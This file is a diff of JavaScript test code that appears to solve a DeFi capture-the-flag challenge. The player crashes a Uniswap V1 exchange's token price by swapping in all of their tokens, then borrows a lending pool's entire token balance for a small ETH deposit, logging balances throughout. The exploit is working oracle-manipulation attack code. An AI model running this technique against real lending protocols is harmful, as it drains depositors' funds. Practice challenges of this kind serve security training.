@@ -1,0 +1,48 @@
+##
+
+METHODOLOFGY : make the attacking contract Work. dont wast etuesday
+##
+console.log("about to interact with exchange ")
+        const requiredTokens = await uniswapExchange.getTokenToEthInputPrice(10n*10n**18n, { gasLimit: 1e6 })
+        console.log("about to interact with token ")
+        await token.connect(player).approve(uniswapExchange.address, 1000000n*10n**18n)
+        console.log("about to interact with exchange ")
+
+        let eth = await ethers.provider.getBalance(uniswapExchange.address)
+        let tokenB = await token.balanceOf(uniswapExchange.address)
+
+        console.log("Ether in contract is ")
+        console.log(eth)
+        console.log("Token in contract is ")
+        console.log(tokenB)    
+
+
+        // get input price and put that in tat ting
+        let subit = PLAYER_INITIAL_TOKEN_BALANCE
+        let plug = await uniswapExchange.getTokenToEthInputPrice(    subit ,            { gasLimit: 1e6 }        )
+        await uniswapExchange.connect(player).tokenToEthSwapInput(subit, plug, 1716994539);
+
+         eth = await ethers.provider.getBalance(uniswapExchange.address)
+         tokenB = await token.balanceOf(uniswapExchange.address)
+        
+
+        console.log("Ether in contract is ")
+        console.log(eth)
+        console.log("Token in contract is ")
+        console.log(tokenB)
+
+
+        console.log("about to interact with exchange 2")
+        // we skip using public view function to see the rate for which we want        
+        const bigNum = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: PLAYER_INITIAL_ETH_BALANCE})
+        console.log(bigNum)
+
+        // just borrow everything
+        console.log('balance of pool is ')
+        let a = await token.balanceOf(lendingPool.address)
+        console.log(a)
+
+        console.log('balance of player is ')
+        a = await token.balanceOf(player.address)
+        console.log(a)
